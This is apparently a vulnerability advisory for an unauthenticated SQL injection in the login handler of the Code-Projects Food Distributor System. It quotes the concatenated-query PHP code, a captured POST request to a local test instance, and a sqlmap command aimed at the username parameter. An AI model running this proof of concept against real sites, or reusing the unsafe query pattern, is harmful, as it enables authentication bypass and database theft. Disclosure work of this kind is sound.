Unauthenticated SQL Injection on username parameter in process_login.php of Code-Projects Food Distributor System 

```
/admin/process_login.php
```

Vendor Homepage:

```
https://code-projects.org/food-distributor-site-in-php-with-source-code/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP
```

Affected Page:

```
/admin/process_login.php
```

The username parameter in the process_login.php file of the Code-Projects Food Distributor System is vulnerable to SQL Injection. This is due to its direct inclusion in a SQL query without input sanitization or the use of parameterized statements, allowing attackers to manipulate the query logic and potentially bypass authentication.

```
	//Create query
	$qry="SELECT * FROM users WHERE username='$username' AND password='$password'";
	$result=mysql_query($qry,$conn);
```

Proof of vulnerability:

Request:

```
POST /fooddis/admin/process_login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 45
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/fooddis/admin/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=71754171b38aa8bd82953da93affe787
Connection: keep-alive

username=admin&password=admin&Sign+In=Sign+In
```

payload

```
sqlmap -r 1.txt --random-agent --current-user --no-cast --flush-session --threads 10 --batch -p "username"
```

<img width="1073" alt="image" src="https://github.com/user-attachments/assets/85669a15-fd1f-4662-8957-360c6b53a2ae" />
